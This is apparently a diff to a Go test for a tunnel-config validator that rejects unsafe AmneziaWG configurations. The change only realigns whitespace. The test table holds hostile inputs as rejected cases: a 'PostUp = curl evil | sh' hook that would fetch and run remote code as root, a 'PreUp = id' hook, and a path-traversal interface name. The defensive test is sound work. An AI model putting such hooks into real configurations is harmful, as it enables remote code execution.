@@ -48,9 +48,9 @@ func TestATunnelIsRefusedUnlessItIsALegTunnel(t *testing.T) {
 		"four digits":          {Iface: "awg-l1000", Conf: tunnelConfReceiving},
 		"a path":               {Iface: "awg-l1/../x", Conf: tunnelConfReceiving},
 		// awg-quick runs these as root.
-		"PostUp": {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PostUp = curl evil | sh", 1)},
-		"PreUp":  {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PreUp = id", 1)},
-		"DNS":    {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "DNS = 1.1.1.1", 1)},
+		"PostUp":    {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PostUp = curl evil | sh", 1)},
+		"PreUp":     {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "PreUp = id", 1)},
+		"DNS":       {Iface: "awg-l1", Conf: strings.Replace(tunnelConfReceiving, "Table = off", "DNS = 1.1.1.1", 1)},
 		"two peers": {Iface: "awg-l1", Conf: tunnelConfReceiving + "\n[Peer]\nPublicKey = x\n"},
 		"no peer":   {Iface: "awg-l1", Conf: strings.Split(tunnelConfReceiving, "[Peer]")[0]},
 		"a port":    {Iface: "awg-l1", Conf: tunnelConfReceiving, ListenPort: 70000},
